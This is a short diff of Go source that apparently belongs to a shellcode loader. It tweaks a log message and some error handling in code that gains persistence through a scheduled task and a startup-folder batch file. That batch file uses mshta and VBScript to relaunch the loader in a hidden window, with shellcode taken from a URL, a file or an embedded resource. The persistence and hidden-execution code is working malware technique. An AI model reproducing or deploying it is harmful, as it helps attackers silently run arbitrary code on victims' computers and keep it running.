@@ -28,7 +28,7 @@ func StartUp() {
 		fmt.Println("已添创建计划任务，将于每天的23:30执行")
 		return
 	}
-	fmt.Println("设置自启，即将执行shell code")
+	fmt.Println("设置自启失败，即将执行shell code")
 }
 
 func init() {
@@ -80,21 +80,25 @@ func startMenu() error {
 mshta vbscript:createobject("wscript.shell").run("%s -u %s h",0)(window.close)&&exit 
 `, appPath, Uri)
 	}
+
 	if FilePath != "" {
 		startBat = fmt.Sprintf(`
 @echo off 　　 
 mshta vbscript:createobject("wscript.shell").run("%s -r %s h",0)(window.close)&&exit 
 `, appPath, FilePath)
 	}
+
 	if Resource != "" {
 		startBat = fmt.Sprintf(`
 @echo off 　　 
 mshta vbscript:createobject("wscript.shell").run("%s -s %s h",0)(window.close)&&exit 
 `, appPath, Resource)
 	}
+
 	startPath += rand + ".bat"
 
-	if file, err := os.Create(startPath); err == nil {
+	file, err := os.Create(startPath)
+	if err == nil {
 		_, err = file.Write([]byte(startBat))
 		defer file.Close()
 	}
